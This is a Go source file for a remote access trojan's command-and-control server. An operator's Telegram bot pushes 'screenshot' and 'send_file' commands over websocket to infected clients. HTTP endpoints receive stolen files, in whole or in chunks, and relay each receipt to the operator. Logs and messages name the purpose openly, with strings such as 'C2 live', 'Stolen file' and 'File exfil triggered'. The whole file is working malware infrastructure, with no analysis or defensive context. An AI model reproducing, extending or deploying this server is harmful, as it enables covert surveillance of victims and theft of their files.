package main

import (
	"context"
		"encoding/json"
			"fmt"
				"io"
					"log"
						"net/http"
							"os"
								"os/signal"
									"strconv"
										"strings"
											"syscall"
												"time"

													"github.com/go-telegram/bot"
														"github.com/go-telegram/bot/models"
															"github.com/gorilla/websocket"
															)

															var (
																token      = os.Getenv("TELEGRAM_TOKEN")
																	chatIDStr  = os.Getenv("CHAT_ID")
																		clients    = make(map[*websocket.Conn]struct{})
																			upgrader   = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
																			)

																			var chatID int64

																			func init() {
																				var err error
																					chatID, err = strconv.ParseInt(chatIDStr, 10, 64)
																						if err != nil {
																								log.Fatal("Invalid CHAT_ID:", err)
																									}
																									}

																									func main() {
																										ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
																											defer cancel()

																												// Bot polling
																													go func() {
																															b, err := bot.New(token)
																																	if err != nil {
																																				log.Fatal("Bot init error:", err)
																																						}
																																								b.RegisterHandler(bot.HandlerTypeMessageText, func(botCtx context.Context, b *bot.Bot, update *models.Update) {
																																											if update.Message == nil || update.Message.Chat.ID != chatID {
																																															return
																																																		}
																																																					msg := strings.ToLower(update.Message.Text)
																																																								switch {
																																																											case msg == "/start":
																																																															b.SendMessage(botCtx, &bot.SendMessageParams{ChatID: chatID, Text: "Wybierz urządzenie:"})
																																																																		case strings.Contains(msg, "screenshot"):
																																																																						broadcastWS("screenshot")
																																																																										b.SendMessage(botCtx, &bot.SendMessageParams{ChatID: chatID, Text: "Screenshot command sent."})
																																																																													case strings.Contains(msg, "send_file"):
																																																																																	broadcastWS("send_file")
																																																																																					b.SendMessage(botCtx, &bot.SendMessageParams{ChatID: chatID, Text: "File exfil triggered."})
																																																																																								}
																																																																																										})
																																																																																												if err := b.Start(ctx); err != nil {
																																																																																															log.Println("Bot start error:", err)
																																																																																																	}
																																																																																																		}()

																																																																																																			// HTTP handlers
																																																																																																				http.HandleFunc("/", rootHandler)
																																																																																																					http.HandleFunc("/upload", uploadHandler)
																																																																																																						http.HandleFunc("/upload_chunked", chunkedHandler)
																																																																																																							http.HandleFunc("/ws", wsHandler)

																																																																																																								port := os.Getenv("PORT")
																																																																																																									if port == "" {
																																																																																																											port = "10000"
																																																																																																												}
																																																																																																													log.Printf("C2 live on :%s", port)
																																																																																																														log.Fatal(http.ListenAndServe(":"+port, nil))
																																																																																																														}

																																																																																																														func rootHandler(w http.ResponseWriter, r *http.Request) {
																																																																																																															w.Header().Set("Content-Type", "application/json")
																																																																																																																json.NewEncoder(w).Encode(map[string]interface{}{
																																																																																																																		"base_url":          r.Host,
																																																																																																																				"connected_devices": []string{},
																																																																																																																						"status":            "running",
																																																																																																																							})
																																																																																																																							}

																																																																																																																							func uploadHandler(w http.ResponseWriter, r *http.Request) {
																																																																																																																								if r.Method != "POST" {
																																																																																																																										http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
																																																																																																																												return
																																																																																																																													}
																																																																																																																														file, header, err := r.FormFile("file")
																																																																																																																															if err != nil {
																																																																																																																																	http.Error(w, "No file", http.StatusBadRequest)
																																																																																																																																			return
																																																																																																																																				}
																																																																																																																																					defer file.Close()

																																																																																																																																						data, err := io.ReadAll(file)
																																																																																																																																							if err != nil {
																																																																																																																																									log.Println("Upload ReadAll error:", err)
																																																																																																																																											http.Error(w, "Read error", http.StatusInternalServerError)
																																																																																																																																													return
																																																																																																																																														}
																																																																																																																																															msg := fmt.Sprintf("Stolen file: %s (%dB)", header.Filename, len(data))
																																																																																																																																																log.Println(msg)
																																																																																																																																																	sendMsg(msg)
																																																																																																																																																		w.Write([]byte("OK"))
																																																																																																																																																		}

																																																																																																																																																		func chunkedHandler(w http.ResponseWriter, r *http.Request) {
																																																																																																																																																			if r.Method != "POST" {
																																																																																																																																																					http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
																																																																																																																																																							return
																																																																																																																																																								}
																																																																																																																																																									defer r.Body.Close()
																																																																																																																																																										data, err := io.ReadAll(r.Body)
																																																																																																																																																											if err != nil {
																																																																																																																																																													log.Println("Chunked ReadAll error:", err)
																																																																																																																																																															http.Error(w, "Read error", http.StatusInternalServerError)
																																																																																																																																																																	return
																																																																																																																																																																		}
																																																																																																																																																																			msg := fmt.Sprintf("Chunked exfil: %dB", len(data))
																																																																																																																																																																				log.Println(msg)
																																																																																																																																																																					sendMsg(msg)
																																																																																																																																																																						w.Write([]byte("OK"))
																																																																																																																																																																						}

																																																																																																																																																																						func wsHandler(w http.ResponseWriter, r *http.Request) {
																																																																																																																																																																							conn, err := upgrader.Upgrade(w, r, nil)
																																																																																																																																																																								if err != nil {
																																																																																																																																																																										log.Println("WS upgrade error:", err)
																																																																																																																																																																												return
																																																																																																																																																																													}
																																																																																																																																																																														clients[conn] = struct{}{}
																																																																																																																																																																															log.Println("RAT connected via WS")

																																																																																																																																																																																for {
																																																																																																																																																																																		_, msg, err := conn.ReadMessage()
																																																																																																																																																																																				if err != nil {
																																																																																																																																																																																							delete(clients, conn)
																																																																																																																																																																																										conn.Close()
																																																																																																																																																																																													log.Println("WS read error:", err)
																																																																																																																																																																																																break
																																																																																																																																																																																																		}
																																																																																																																																																																																																				cmd := string(msg)
																																																																																																																																																																																																						log.Printf("RAT report: %s", cmd)
																																																																																																																																																																																																								sendMsg("RAT: " + cmd)
																																																																																																																																																																																																									}
																																																																																																																																																																																																									}

																																																																																																																																																																																																									func broadcastWS(cmd string) {
																																																																																																																																																																																																										for conn := range clients {
																																																																																																																																																																																																												if err := conn.WriteMessage(websocket.TextMessage, []byte(cmd)); err != nil {
																																																																																																																																																																																																															log.Println("WS broadcast error:", err)
																																																																																																																																																																																																																		delete(clients, conn)
																																																																																																																																																																																																																					conn.Close()
																																																																																																																																																																																																																							}
																																																																																																																																																																																																																								}
																																																																																																																																																																																																																								}

																																																																																																																																																																																																																								func sendMsg(text string) {
																																																																																																																																																																																																																									b, err := bot.New(token)
																																																																																																																																																																																																																										if err != nil {
																																																																																																																																																																																																																												log.Println("SendMsg bot init error:", err)
																																																																																																																																																																																																																														return
																																																																																																																																																																																																																															}
																																																																																																																																																																																																																																_, err = b.SendMessage(context.Background(), &bot.SendMessageParams{
																																																																																																																																																																																																																																		ChatID: chatID,
																																																																																																																																																																																																																																				Text:   text,
																																																																																																																																																																																																																																					})
																																																																																																																																																																																																																																						if err != nil {
																																																																																																																																																																																																																																								log.Println("SendMsg error:", err)
																																																																																																																																																																																																																																									}
																																																																																																																																																																																																																																									}